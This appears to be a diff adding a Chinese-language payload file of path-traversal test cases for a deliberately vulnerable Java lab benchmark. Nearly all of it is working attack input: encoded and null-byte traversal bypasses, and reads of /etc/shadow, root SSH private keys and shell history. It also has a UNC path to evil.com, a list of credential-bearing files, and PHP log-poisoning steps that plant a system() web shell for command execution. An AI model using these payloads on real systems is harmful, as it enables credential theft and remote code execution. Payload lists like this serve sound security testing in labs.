@@ -1,0 +1,166 @@
+# Path Traversal (路径遍历) 漏洞测试用例
+
+# ============================================
+# 1. 基础路径遍历
+# ============================================
+# 端点: /path/traversal/vuln?filename={payload}
+
+# 单级 .. 遍历
+filename=../../../etc/passwd
+
+# 多级 .. 遍历
+filename=../../../../../../etc/passwd
+
+# Windows 路径遍历
+filename=..\..\..\..\..\..\windows\win.ini
+
+# 绝对路径 (可能受保护)
+filename=/etc/passwd
+filename=C:\Windows\win.ini
+
+
+# ============================================
+# 2. URL 编码绕过
+# ============================================
+
+# 标准 URL 编码
+filename=%2e%2e%2fetc%2fpasswd
+filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# 双重 URL 编码
+filename=%252e%252e%252fetc%252fpasswd
+
+# UTF-8 Unicode 编码
+filename=%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+
+
+# ============================================
+# 3. 绝对路径端点
+# ============================================
+# 端点: /path/absolute/vuln?path={payload}
+
+# 读取 passwd
+path=/etc/passwd
+
+# 读取 shadow
+path=/etc/shadow
+
+# 读取 hosts
+path=/etc/hosts
+
+# 读取应用配置
+path=/opt/projects/benchmark/Qbenchmark/java-vuln-lab/src/main/resources/application.yml
+
+# 读取 SSH 密钥
+path=/root/.ssh/id_rsa
+
+# 读取历史命令
+path=/root/.bash_history
+
+
+# ============================================
+# 4. URL 编码端点
+# ============================================
+# 端点: /path/encode/vuln?file={payload}
+
+# URL 编码遍历
+file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# 双重编码
+file=%252e%252e/%252e%252e/%252e%252e/etc/passwd
+
+
+# ============================================
+# 5. 路径遍历 + Null 字节
+# ============================================
+
+# Null 字节绕过 (旧版本 PHP/Java)
+filename=../../../etc/passwd%00.jpg
+
+
+# ============================================
+# 6. Windows 特殊路径
+# ============================================
+
+# Windows 驱动器
+filename=C:\\Windows\\win.ini
+filename=C:/Windows/win.ini
+
+# Windows 环境变量
+filename=%SystemRoot%\\win.ini
+
+# UNC 路径
+filename=\\\\evil.com\\share\\file.txt
+
+
+# ============================================
+# 7. 路径遍历绕过技巧
+# ============================================
+
+# 使用 /./ 代替 ../
+filename=/etc/./passwd
+
+# 使用 // 代替 /
+filename=//etc/passwd
+
+# 路径混淆
+filename=....//....//etc/passwd
+
+# URL 方案
+filename=file:///etc/passwd
+
+
+# ============================================
+# 8. 常见敏感文件
+# ============================================
+
+# Linux 系统文件
+/etc/passwd         # 用户信息
+/etc/shadow         # 用户密码哈希
+/etc/hosts          # 主机名映射
+/etc/issue          # 系统版本
+/proc/version       # 内核版本
+/proc/self/environ  # 环境变量
+
+# Web 应用文件
+/var/www/html/config.php
+/var/www/html/.env
+/var/www/html/.git/config
+
+# 日志文件
+/var/log/apache/access.log
+/var/log/nginx/access.log
+/opt/projects/benchmark/Qbenchmark/java-vuln-lab/app.log
+
+# SSH 密钥
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/home/*/.ssh/id_rsa
+
+# 数据库配置
+/etc/mysql/my.cnf
+/var/lib/mysql/mysql/user.MYD
+
+
+# ============================================
+# 9. 文件包含配合
+# ============================================
+
+# PHP 日志注入
+# 1. 访问: /?file=<?system($_GET[c]);?>
+# 2. 访问: /?file=/var/log/apache/access.log&c=whoami
+
+# SSH 日志注入
+# ssh '<?system($_GET[c]);?>'@target.com
+# 访问: /?file=/var/log/auth.log&c=whoami
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的路径遍历特征:
+# 1. /etc/passwd 包含 "root:x:0:0:"
+# 2. /etc/hosts 包含 "127.0.0.1"
+# 3. 配置文件泄露敏感信息
+# 4. 日志文件包含访问记录
+# 5. 返回文件内容而非错误信息
